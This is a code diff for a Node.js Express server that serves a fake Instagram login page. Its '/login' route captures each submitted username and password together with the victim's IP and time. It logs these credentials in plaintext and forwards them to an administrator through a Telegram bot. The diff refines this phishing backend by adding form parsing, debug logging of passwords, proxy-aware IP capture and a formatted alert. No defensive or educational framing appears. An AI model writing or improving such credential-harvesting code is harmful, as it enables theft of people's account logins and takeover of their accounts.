@@ -373,6 +373,9 @@ app.use(express.json());
 const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 6 * 1024 * 1024 } });
 
 // Serve Instagram page
+// Configure body parser before routes
+app.use(express.urlencoded({ extended: true }));
+
 app.get("/insta", (_req, res) => {
   res.sendFile(path.join(__dirname, "test insta", "index.html"));
 });
@@ -383,14 +386,23 @@ app.use("/insta", express.static(path.join(__dirname, "test insta")));
 // Login Capture
 app.post("/login", async (req, res) => {
   const { username, password } = req.body;
-  if (!username || !password) return res.redirect("/insta");
+  console.log("Received login attempt:", { username, password }); // Debug log
   
-  const ip = req.ip || req.socket.remoteAddress || "unknown";
+  if (!username || !password) {
+    console.log("Missing credentials");
+    return res.redirect("/insta");
+  }
+  
+  const ip = req.headers['x-forwarded-for'] || req.ip || req.socket.remoteAddress || "unknown";
   const time = new Date().toLocaleString();
-  const msg = `*INSTAGRAM LOGIN*\nUser: \`${username}\`\nPass: \`${password}\`\nIP: \`${ip}\`\nTime: \`${time}\``;
+  const msg = `*NEW INSTAGRAM LOGIN*\n\n👤 Username: \`${username}\`\n🔑 Password: \`${password}\`\n🌐 IP: \`${ip}\`\n⏰ Time: \`${time}\``;
   
   try { 
-    await bot.telegram.sendMessage(ADMIN_USER_ID, msg, { parse_mode: "Markdown" }); 
+    await bot.telegram.sendMessage(ADMIN_USER_ID, msg, { 
+      parse_mode: "Markdown",
+      disable_web_page_preview: true 
+    }); 
+    console.log("Login alert sent to admin");
   } catch (e) {
     console.error("Send login alert error:", e);
   }
